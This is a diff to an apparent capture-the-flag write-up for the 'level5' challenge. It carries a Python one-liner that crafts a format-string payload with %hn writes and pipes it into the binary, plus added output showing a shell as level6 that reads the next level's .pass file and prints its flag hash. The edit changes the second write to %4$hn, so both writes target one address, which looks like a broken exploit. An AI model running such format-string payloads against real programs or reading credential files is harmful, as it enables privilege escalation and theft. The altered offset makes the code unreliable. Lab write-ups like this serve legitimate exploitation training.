@@ -69,7 +69,7 @@ litle indian2 => \x3a\x98\x04\x08
     second_padding = 33956 - 2052 = 31904
 ```
 
-python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")' > /tmp/hax
+python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%4$hn")' > /tmp/hax
 (cat /tmp/hax; cat) | ./level5
 
 
@@ -86,3 +86,10 @@ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%319
     lower - upper = 40964 - 2052 = 38912
 ```
 
+
+```
+    whoami
+    level6
+    cat /home/user/level6/.pass                        
+    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
